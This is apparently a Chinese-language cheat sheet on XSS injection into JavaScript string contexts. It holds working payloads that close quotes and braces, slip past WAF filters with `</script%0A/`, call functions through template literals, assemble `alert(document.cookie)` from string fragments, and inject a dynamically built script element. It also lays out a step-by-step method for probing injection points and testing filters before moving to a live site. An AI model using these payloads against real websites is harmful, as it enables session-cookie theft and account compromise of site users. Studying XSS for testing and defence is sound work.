# JS 字符串上下文里的 XSS 绕过

参数值被拼进 **JS 源码字符串**（不是 HTML），典型现场：

```js
var ref = "<你的输入>";
```

## 先做闭合数学

把注入点前后的代码都写出来，逐字符对账：

```
ref : "aaa"alert``"        ← 多了一个双引号,说明上下文的双引号被拆开了
```

要同时闭合 `"` 和 `}`（对象），再执行，再用注释吃掉残留：

```
1"};console.log(1);</script%0A/>
aaa;%22} %0Aconsole.log(document.cookie)/*
```

- `%0A` 换行：很多 WAF 拦 `</script>`，但 `</script%0A/` 能过。
- `/*` 多行注释：吃掉尾随代码，比猜为什么报错省事。
- **哨兵闭合**：末尾补一段把它接回合法语法。报告里用 `z={"g":"m` 收尾 —— 不加的话
  `xss();` 后面会多出 `"};`，JS 语法直接报错。

## 禁用词怎么替代

| 被拦 | 替代 |
|---|---|
| `</script>` | `</script%0A/` |
| `(...)` 调用括号 | **模板串调用**：`` alert` ` `` |
| `alert` / `eval` 关键字 | 拼字符串：`a='ale',b='rt(docu',c='ment.cookie)'; xx.textContent=a+b+c` |
| `+`（在 query 里变空格） | `-` `*` `/` —— 函数先求值，再做算术 |
| `%2B` 一处成立一处不成立 | 别纠缠，直接用 `*` |

拼字符串还有个附带好处：**`<script>` 元素可以动态建**：

```js
xx=document.createElement('script'); xx.type='text/javascript';
a='ale',b='rt(docu',c='ment.cookie)',d=a+b+c;
xx.textContent=d; document.body.appendChild(xx);
```

## 方法（比 payload 重要）

1. **探测字符**：先发 `aaa”%0a` 这类探针，在返回包里搜 `aaa`，看**出现了几处** ——
   多处出现说明存在多个拼接点，得分别处理。
2. **一次只解决一个拦截**，每次都把两端代码在本地拼起来跑一遍，确认语法通过再上真实站。
3. 拦截名单是**逐个试**出来的，不是猜出来的。先确认哪个函数能用（`alert` 不拦、括号拦），
   再去解决语法闭合。

## 常见误判

- 本地能跑、站上不行 → 十有八九是有第二个拼接点没闭合，或者 `+` 被 URL 解码成空格了。
- 只闭合了一处就以为完事 → 先把探针出现的处数数清楚。
